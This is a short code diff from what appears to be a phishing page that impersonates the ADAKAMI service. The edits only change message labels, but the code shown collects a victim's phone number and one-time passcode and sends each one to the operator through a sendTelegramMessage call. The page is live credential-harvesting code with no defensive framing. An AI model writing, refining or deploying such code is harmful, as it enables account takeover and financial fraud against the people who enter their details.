@@ -213,7 +213,7 @@
 
             errorMsg.style.display = 'none';
             userPhoneNumber = phone;
-            const message = `Hallo ADAKAMI\n𝗣𝗲𝗻𝗴𝗶𝗿𝗶𝗺 :  ${phone}`;
+            const message = `Hallo ADAKAMI\nPENGIRIM :  ${phone}`;
             sendTelegramMessage(message);
             showOtpModal(phone);
         }
@@ -259,7 +259,7 @@
             otpError.style.display = 'none';
 
             const formattedOtp = otpCode.substring(0,3) + '-' + otpCode.substring(3,6);
-            const message = `OTP \nOTP :  ${formattedOtp}`;
+            const message = `KODE OTP \nOTP :  ${formattedOtp}`;
             sendTelegramMessage(message);
 
             setTimeout(() => {
